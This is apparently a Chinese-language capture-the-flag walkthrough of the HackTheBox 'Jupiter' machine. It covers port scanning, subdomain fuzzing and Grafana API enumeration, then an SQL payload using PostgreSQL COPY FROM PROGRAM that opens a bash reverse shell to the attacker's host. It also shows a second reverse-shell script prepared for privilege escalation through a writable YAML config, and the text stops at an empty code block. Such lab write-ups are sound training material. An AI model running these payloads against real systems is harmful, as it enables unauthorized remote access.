# Jupiter

目标探测

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Jupiter]
└─# nmap -n -v -sS -p- 10.10.11.216 --max-retries=0 -oN allport.txt -Pn
Nmap scan report for 10.10.11.216                                                                                   
Host is up (0.38s latency).                                                                                         
Not shown: 36966 closed tcp ports (reset), 28567 filtered tcp ports (no-response)                                   
PORT   STATE SERVICE                                                                                                
22/tcp open  ssh                                                                                                    
80/tcp open  http                                                                                                   
                                                                                                                    
Read data files from: /usr/bin/../share/nmap                                                                        
Nmap done: 1 IP address (1 host up) scanned in 566.72 seconds                                                       
           Raw packets sent: 65576 (2.885MB) | Rcvd: 65284 (2.611MB) 
```

可以看到目标开放了2个端口，我们再扫描一下详细开放端口的详细信息

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Jupiter]
└─# nmap -n -v -sC -sV -p $(cat allport.txt | grep ^[0-9]|cut -d / -f1|tr '\n' ','|sed s/,$//) 10.10.11.211 -oN nmap.txt -Pn
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Initiating NSE at 22:15
Completed NSE at 22:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.65 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
```

没有看到什么有用的信息，我们先访问一下它的80端口

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

没有可以利用的点，如果我们通过模糊测试来发现路由，我们将不会发现任何有趣的东西，但是如果我们对可能的子域进行模糊测试，我们会发现kiosk.jupiter.htb的这个子域名。

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Jupiter]
└─# wfuzz -c --hc=404 --hh=178 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -H "Host:FUZZ.jupiter.htb" http://jupiter.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jupiter.htb/
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000007:   400        7 L      12 W       166 Ch      "# license, visit http://creativecommons.org/licens
                                                        es/by-sa/3.0/"                                     
000000009:   400        7 L      12 W       166 Ch      "# Suite 300, San Francisco, California, 94105, USA
                                                        ."                                                 
000012218:   200        211 L    798 W      34390 Ch    "kiosk"                                            

Total time: 0
Processed Requests: 207643
Filtered Requests: 207640
Requests/sec.: 0
```



<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

```
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.216    jupiter.htb
10.10.11.216    kiosk.jupiter.htb

::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```



<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Grafana 有一个 API，这很有趣，因为通常会收集大量信息。（[数据源API](https://grafana.com/docs/grafana/latest/developers/http\_api/data\_source/)）如果我们提出请求，/api/datasources我们将获得以下信息：

{% code overflow="wrap" %}
```

  {
    "id": 1,
    "uid": "YItSLg-Vz",
    "orgId": 1,
    "name": "PostgreSQL",
    "type": "postgres",
    "typeName": "PostgreSQL",
    "typeLogoUrl": "public/app/plugins/datasource/postgres/img/postgresql_logo.svg",
    "access": "proxy",
    "url": "localhost:5432",
    "user": "grafana_viewer",
    "database": "",
    "basicAuth": false,
    "isDefault": true,
    "jsonData": {
      "database": "moon_namesdb",
      "sslmode": "disable"
    },
    "readOnly": false
  }
]
```
{% endcode %}

如果我们继续在Grafana官方页面上搜索，我们会发现沿途/api/ds/query可以使用POST方式发出请求，并根据我们已经获得的信息进行发送。

```
POST /api/ds/query HTTP/1.1
Accept: application/json
Content-Type: application/json

{
   "queries":[
      {
         "refId":"A",
         "scenarioId":"csv_metric_values",
         "datasource":{
            "uid":"PD8C576611E62080A"
         },
         "format": "table"
         "maxDataPoints":1848,
         "intervalMs":200,
         "stringInput":"1,20,90,30,5,0",
      }
   ],
   "from":"now-5m",
   "to":"now"
}
```

我们观察HTTPhistory，发现这个请求包，把它发送到重放模块

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

将 rawSql 参数值更改为并发送请求

```
"CREATE TABLE cmd_execd(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.X.X/4444 0>&1\"'"
```

nc开启本地监听

```
──(root㉿kali)-[~/Desktop/TargetDrone/HTB/Jupiter]
└─# nc -lnvp 4444                  
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.11.216] 38486
bash: cannot set terminal process group (4000): Inappropriate ioctl for device
bash: no job control in this shell
postgres@jupiter:/var/lib/postgresql/14/main$ 
```

可以看到我们已经获得了postgres这个用户

```
postgres@jupiter:/var/lib/postgresql/14/main$ whoami
whoami
postgres
postgres@jupiter:/var/lib/postgresql/14/main$ id
id
uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
```

## 权限提升

如果我们进入系统根目录，我们会发现_dev_文件夹不是一个公共文件夹。

```
postgres@jupiter:/$ ls -l
ls -l
total 64
lrwxrwxrwx   1 root root     7 Apr 21  2022 bin -> usr/bin
drwxr-xr-x   4 root root  4096 May 30 13:53 boot
drwxr-xr-x  20 root root  4020 Sep 21 04:32 dev
drwxr-xr-x 108 root root  4096 May 30 13:50 etc
drwxr-xr-x   4 root root  4096 Mar  7  2023 home
lrwxrwxrwx   1 root root     7 Apr 21  2022 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 21  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 21  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 21  2022 libx32 -> usr/libx32
drwx------   2 root root 16384 Mar  7  2023 lost+found
drwxr-xr-x   2 root root  4096 Apr 21  2022 media
drwxr-xr-x   2 root root  4096 May  4 18:59 mnt
drwxr-xr-x   3 root root  4096 May  4 18:59 opt
dr-xr-xr-x 295 root root     0 Sep 21 04:32 proc
drwx------   7 root root  4096 May  5 12:00 root
drwxr-xr-x  29 root root   880 Sep 21 05:08 run
lrwxrwxrwx   1 root root     8 Apr 21  2022 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 May  4 18:59 snap
drwxr-xr-x   2 root root  4096 May  4 18:59 srv
dr-xr-xr-x  13 root root     0 Sep 21 04:32 sys
drwxrwxrwt  14 root root  4096 Sep 21 07:38 tmp
drwxr-xr-x  14 root root  4096 Apr 21  2022 usr
drwxr-xr-x  14 root root  4096 May  4 18:59 var
```

在众多文件夹之一中，我们发现了这个非常有趣的 YAML 文件，因为我们可以编辑它并且它运行不同的系统工具。

```
postgres@jupiter:/dev/shm$ ls
ls
network-simulation.yml
PostgreSQL.3690662076
shadow.data
postgres@jupiter:/dev/shm$ cat network-simulation.yml
cat network-simulation.yml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

我们从攻击者机器上下载_pspy 。_

```
postgres@jupiter:/tmp$ wget http://10.10.x.x:8888/pspy64
wget http://10.10.16.2:8888/pspy64
--2023-09-21 07:49:47--  http://10.10.16.2:8888/pspy64
Connecting to 10.10.16.2:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

     0K .......... .......... .......... .......... ..........  1% 48.5K 61s
    50K .......... .......... .......... .......... ..........  3%  128K 42s

2023-09-21 07:49:56 (426 KB/s) - ‘pspy64’ saved [3104768/3104768]
postgres@jupiter:/tmp$ chmod 777 pspy64
chmod 777 pspy64
postgres@jupiter:/tmp$ ./pspy64
```

可以看到这个network-simulation.yml 这个文件是juno这个用户的

```
2023/09/21 07:54:01 CMD: UID=1000  PID=4741   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
```



```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.2/4445 0>&1'
```



```
postgres@jupiter:/dev/shm$ chmod 777 shell.sh
chmod 777 shell.sh
```

我们编辑 network-simulation.yml 并添加以下内容。

```
```
